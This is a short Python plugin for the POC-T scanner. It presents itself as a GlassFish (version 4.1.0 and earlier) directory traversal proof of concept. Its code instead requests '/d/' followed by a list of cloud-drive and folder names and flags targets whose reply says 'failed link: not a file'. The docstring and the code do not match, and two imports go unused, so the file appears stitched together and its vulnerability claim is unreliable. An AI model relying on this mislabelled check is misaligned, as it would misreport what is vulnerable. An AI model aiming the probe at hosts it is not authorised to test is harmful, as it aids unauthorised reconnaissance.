#!/usr/bin/env python
# -*- coding: utf-8 -*-
# project = https://github.com/Xyntax/POC-T
# author = i@cdxy.me

"""
GlassFish directory traversal vulnerability PoC

version <= 4.1.0

Usage:
  python POC-T.py -s glassfish-traversal -aZ "GlassFish Server Open Source Edition 4.1"

"""

import requests
from plugin.useragent import firefox
from plugin.urlparser import get_domain


def poc(url):
    if '://' not in url:
        url = 'http://' + url
    target = url.strip("/")
    target = '%s/d/' % target
    try:
        dir_name_list = ["阿里云盘", "Onedrive", "天翼云盘", "123云盘",
                         "百度网盘", "一刻相册", "谷歌云盘", "PikPak",
                         "迅雷云盘", "夸克网盘", "电影", "电视剧",
                         "音乐", "书籍", "游戏", "软件", "简历",
                         "root", "docker", "alist", "download", "local"]
        for dir_name in dir_name_list:
            result_url = target + dir_name
            response_1 = requests.get(url=result_url, timeout=10)
            if response_1 and "failed link: not a file" in response_1.text:
                print(dir_name)
                return True
    except Exception:
        return False

    return False
